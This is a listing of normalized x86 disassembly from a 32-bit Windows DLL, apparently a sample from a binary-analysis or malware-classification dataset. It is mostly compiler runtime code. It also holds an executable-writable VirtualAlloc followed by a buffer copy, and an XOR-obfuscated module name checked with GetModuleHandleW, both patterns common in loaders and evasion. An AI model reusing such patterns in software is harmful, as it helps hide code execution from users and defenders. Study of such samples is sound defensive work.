mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xdc ]
push edx
call sub_100187af
add esp 0x4
sub_10013380
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
jl r-xdata
cmp eax 0xb
je r-xdata
cmp eax 0x8
jle r-xdata
mov eax 0x1
pop ebp
retn
cmp eax 0xe
jl r-xdata
cmp eax 0x7f
jl r-xdata
cmp eax 0x1f
jle r-xdata
cmp eax 0xfdd0
jl r-xdata
cmp eax 0x9f
jle r-xdata
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp eax 0xfdef
jle r-xdata
cmp eax 0xffff
je r-xdata
xor eax eax
pop ebp
retn
sub_100133e0
mov eax [ esi + 0x2c0 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0x2d8 ] 0x8
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x2c0 ] 0x0
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] 0x0
mov [ esi + 0x2c4 ] cx
mov ecx esi
jmp sub_10069020
mov eax [ esi + 0x2c4 ]
push eax
call sub_100187af
add esp 0x4
sub_10013440
cmp esi ebx
je r-xdata
mov eax esi
retn
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov edx [ ebx ]
mov [ esi ] edx
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
push edi
mov edi [ esi + 0x4 ]
call sub_100699f0
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
xor ecx ecx
pop edi
sub_10013486
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100134bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10062bac
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
push 0x3
call sub_10018233
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_10018233
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10049e85
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1007fa90
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1003cbb0
push esi
call sub_1004d400
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10049e85
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_10001062
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_1004d400
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_100198c8
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_10001062
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_1001b4d7
add esp 0xc
jmp r-xdata
sub_1001366b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1003f6c7
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1006d887
push eax
push edi
push esi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_10067d3a
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_100136d5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10013710
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call [ GetModuleHandleW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
xor ecx ebp
neg eax
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10013780
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_100404a0
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov ecx [ esi + 0x90 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push ecx
push 0x0
mov [ esi + 0x6c ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ edi + 0x94 ]
mov eax [ edi + 0x90 ]
mov ecx [ esi + 0x90 ]
push edx
push eax
push ecx
call sub_1007f5d0
mov edx [ edi + 0x94 ]
mov eax [ esi ]
mov [ esi + 0x94 ] edx
mov edx [ eax + 0x8 ]
add esp 0xc
mov ecx esi
call edx
cmp [ edi + 0x98 ] 0x0
je r-xdata
mov eax [ edi + 0x9c ]
mov [ esi + 0x9c ] eax
mov eax [ edi + 0x9c ]
push 0x40
push 0x3000
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov [ esi + 0x98 ] eax
mov ecx [ edi + 0x94 ]
mov edx [ edi + 0x98 ]
push ecx
push edx
push eax
call sub_1007f5d0
add esp 0xc
sub_10013870
push ebp
mov ebp esp
push 0xffffffff
push sub_100868c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_1002e340
jmp r-xdata
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_10013950
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10069747
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10013990
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_1007ec90
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10013a20
push ebp
mov ebp esp
push 0xffffffff
push sub_10086dcb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10007f50
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_1005fbb8
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10013acc
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_100699c1
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_10013b34
push 0xc
push r--data
call sub_1007fb20
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1007fb65
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013bca
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10013c00
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x87
cmp eax 0x3
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x28 ]
mov [ esi ] eax
mov eax [ ecx + 0x2c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x86
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_10053240
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_10013c7e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_10067d3a
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10035d06
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_100064a1
pop ecx
pop ecx
test eax eax
jns r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_10035d06
pop ecx
mov [ ebp - 0x4 ] esi
sub_10013d20
push ebp
mov ebp esp
push 0xffffffff
push sub_10089ba7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10036cc0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x23c ] ebx
mov [ ebp - 0x238 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x23c ] ebx
jne r-xdata
push 0x1
call sub_1001f84c
add esp 0x4
push eax
lea ecx [ ebp - 0x244 ]
mov [ ebp - 0x244 ] ebx
mov [ ebp - 0x240 ] ebx
call sub_10052fd0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x244 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea ecx [ ebp - 0x23c ]
call sub_1000b470
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x23c ]
call sub_10024460
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_100370b0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_1005a340
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x6
jmp r-xdata
mov ecx esi
call sub_100254d0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x7
jmp r-xdata
mov eax esi
call sub_1000a500
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x23c ]
call sub_100534d0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x9
jmp r-xdata
mov ebx [ ebp - 0x23c ]
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10021760
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_100649e0
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10019100
mov esi r--data
mov ecx rw-data
call sub_1004cb20
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0xb
jmp r-xdata
mov esi r--data
mov ecx rw-data
call sub_1004cb20
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0xc
jmp r-xdata
push rw-data
mov edx ebx
mov ecx rw-data
call sub_1002b060
add esp 0x4
test eax eax
je r-xdata
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10062d10
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_100649e0
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10019100
mov esi r--data
mov ecx rw-data
call sub_1004cb20
test al al
je r-xdata
call sub_100601f0
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
xor eax eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0xe
jmp r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0xd
jmp r-xdata
sub_1001415d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_100427ff
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_1003334a
call sub_1003106d
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x22
sub_100141e0
push ecx
push r--data
call sub_1005b710
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10014215
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10014237
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10064902
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100142d4
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1001435e
push 0x20
push r--data
call sub_1007fb20
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1003f6c7
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1007fb65
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1008146b
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10059e7b
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10058c10
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10053997
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100144c5
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10014506
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10062fa9
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_100190d3
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
